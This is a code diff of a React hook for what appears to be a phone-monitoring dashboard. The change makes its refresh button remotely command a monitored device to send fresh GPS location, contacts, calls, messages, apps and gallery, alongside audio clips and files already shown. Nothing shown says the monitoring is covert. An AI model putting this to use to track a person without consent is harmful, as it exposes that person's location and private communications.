@@ -11,14 +11,10 @@ const CACHE_TTL = 300000; // 5 minutes per Rule 12
 const tabCache = new Map<string, { data: any; time: number }>();
 
 export function useDeviceDetail(deviceId: string, checkTabEnabled?: (tab: string) => boolean) {
-  const [device, setDevice] = useState<MonitoredDevice | null>(null), [locations, setLocations] = useState<DeviceLocation[]>([]);
-  const [contacts, setContacts] = useState<DeviceContact[]>([]), [calls, setCalls] = useState<DeviceCall[]>([]);
-  const [messages, setMessages] = useState<DeviceMessage[]>([]), [captures, setCaptures] = useState<any[]>([]);
-  const [audioClips, setAudioClips] = useState<AudioCapture[]>([]), [files, setFiles] = useState<DeviceFileItem[]>([]);
-  const [filesLoading, setFilesLoading] = useState(false), [tabLoading, setTabLoading] = useState(false);
-  const [appCount, setAppCount] = useState(0), [activeTab, setActiveTab] = useState("map");
-  const [loading, setLoading] = useState(true), [isRefreshing, setIsRefreshing] = useState(false);
-  const [toast, setToast] = useState<string | null>(null), [isLiveMovement, setIsLiveMovement] = useState(false);
+  const [device, setDevice] = useState<MonitoredDevice | null>(null), [locations, setLocations] = useState<DeviceLocation[]>([]), [contacts, setContacts] = useState<DeviceContact[]>([]), [calls, setCalls] = useState<DeviceCall[]>([]);
+  const [messages, setMessages] = useState<DeviceMessage[]>([]), [captures, setCaptures] = useState<any[]>([]), [audioClips, setAudioClips] = useState<AudioCapture[]>([]), [files, setFiles] = useState<DeviceFileItem[]>([]);
+  const [filesLoading, setFilesLoading] = useState(false), [tabLoading, setTabLoading] = useState(false), [appCount, setAppCount] = useState(0), [activeTab, setActiveTab] = useState("map");
+  const [loading, setLoading] = useState(true), [isRefreshing, setIsRefreshing] = useState(false), [toast, setToast] = useState<string | null>(null), [isLiveMovement, setIsLiveMovement] = useState(false);
 
   const abortRef = useRef<AbortController | null>(null);
   const supabaseRef = useRef(createClient());
@@ -113,17 +109,10 @@ export function useDeviceDetail(deviceId: string, checkTabEnabled?: (tab: string
   // Periodic light status poll (30s interval, pauses when tab is hidden)
   useEffect(() => {
     fetchLightStatus();
-    let interval: NodeJS.Timeout | null = setInterval(() => {
-      if (typeof document !== "undefined" && !document.hidden) fetchLightStatus();
-    }, 30000);
-    const onVisibility = () => {
-      if (!document.hidden) fetchLightStatus();
-    };
-    document.addEventListener("visibilitychange", onVisibility);
-    return () => {
-      if (interval) clearInterval(interval);
-      document.removeEventListener("visibilitychange", onVisibility);
-    };
+    const interval = setInterval(() => { if (typeof document !== "undefined" && !document.hidden) fetchLightStatus(); }, 30000);
+    const onVis = () => { if (!document.hidden) fetchLightStatus(); };
+    document.addEventListener("visibilitychange", onVis);
+    return () => { clearInterval(interval); document.removeEventListener("visibilitychange", onVis); };
   }, [fetchLightStatus]);
 
   // Live location subscription — active only when Map tab is open
@@ -186,12 +175,23 @@ export function useDeviceDetail(deviceId: string, checkTabEnabled?: (tab: string
     device, locations, contacts, calls, messages, captures, audioClips, files, filesLoading, tabLoading, appCount,
     activeTab, setActiveTab, loading, isRefreshing, toast, isLiveMovement,
     handleFullRefresh: async () => {
-      setIsRefreshing(true); showToast("🔄 Refreshing device telemetry...");
-      const isEnabled = checkTabEnabled ? checkTabEnabled(activeTab) : false;
+      setIsRefreshing(true); showToast("🔄 Refreshing GPS & enabled tabs...");
+      sendCommand("fetch_location", {}, "Fresh GPS");
+      const syncMap: Record<string, string> = { contacts: "sync_contacts", calls: "sync_calls", messages: "sync_messages", apps: "sync_apps", gallery: "sync_gallery" };
       const tasks: Promise<any>[] = [fetchLightStatus()];
-      if (isEnabled) { tabCache.delete(`${deviceId}:${activeTab}`); tasks.push(fetchTabData(activeTab, true, true)); }
+      for (const [tab, cmd] of Object.entries(syncMap)) {
+        if (checkTabEnabled && checkTabEnabled(tab)) {
+          tabCache.delete(`${deviceId}:${tab}`);
+          sendCommand(cmd, {}, `Sync ${tab}`);
+          tasks.push(fetchTabData(tab, true, true));
+        }
+      }
+      if (checkTabEnabled && checkTabEnabled(activeTab) && !syncMap[activeTab]) {
+        tabCache.delete(`${deviceId}:${activeTab}`);
+        tasks.push(fetchTabData(activeTab, true, true));
+      }
       await Promise.all(tasks);
-      showToast("✅ Telemetry updated!"); setIsRefreshing(false);
+      showToast("✅ Fresh data & GPS requested!"); setIsRefreshing(false);
     },
     fetchTabData, handleToggleLiveMovement, sendCommand, ...actions,
   };
